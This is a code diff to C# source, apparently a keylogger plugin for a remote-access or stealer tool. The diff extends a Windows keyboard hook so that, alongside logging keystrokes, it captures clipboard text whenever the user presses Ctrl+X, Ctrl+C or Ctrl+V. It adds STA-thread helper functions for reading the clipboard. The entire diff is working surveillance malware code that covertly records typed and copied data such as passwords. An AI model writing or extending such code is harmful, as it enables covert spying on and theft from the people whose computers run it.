@@ -86,11 +86,12 @@ namespace Plugin
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                 {
                     int vkCode = Marshal.ReadInt32(lParam);
-                    bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
-                    bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
+                    bool capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
+                    bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
+                    bool ctrlPressed = (GetKeyState(0xA2) & 0xffff) != 0 || (GetKeyState(0xA3) & 0xffff) != 0;
                     string currentKey = KeyboardLayout((uint)vkCode);
 
-                    if (capsLock || shiftPress)
+                    if (capsLockPressed || shiftPressed)
                     {
                         currentKey = currentKey.ToUpper();
                     }
@@ -99,9 +100,29 @@ namespace Plugin
                         currentKey = currentKey.ToLower();
                     }
 
-                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                    if (ctrlPressed && ClipboardContainsText())
+                    {
+                        switch ((Keys)vkCode)
+                        {
+                            case Keys.X:
+                                {
+                                    currentKey = $"[CTRL+X]:{ClipboardGetText()}\n";
+                                    break;
+                                }
+                            case Keys.C:
+                                {
+                                    currentKey = $"[CTRL+C]:{ClipboardGetText()}\n";
+                                    break;
+                                }
+                            case Keys.V:
+                            {
+                                    currentKey = $"[CTRL+V]:{ClipboardGetText()}\n";
+                                    break;
+                            }
+                        }
+                    }
+                   else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                         currentKey = "[" + (Keys)vkCode + "]";
-
                     else
                     {
                         switch (((Keys)vkCode).ToString())
@@ -149,6 +170,37 @@ namespace Plugin
             {
                 return IntPtr.Zero;
             }
+        }
+
+        private static bool ClipboardContainsText()
+        {
+            bool ReturnValue = false;
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    ReturnValue = Clipboard.ContainsText();
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
+        }
+
+        private static string ClipboardGetText()
+        {
+            Thread.Sleep(500);
+            string ReturnValue = string.Empty;
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    ReturnValue = Clipboard.GetText();
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
         }
 
         private static string KeyboardLayout(uint vkCode)
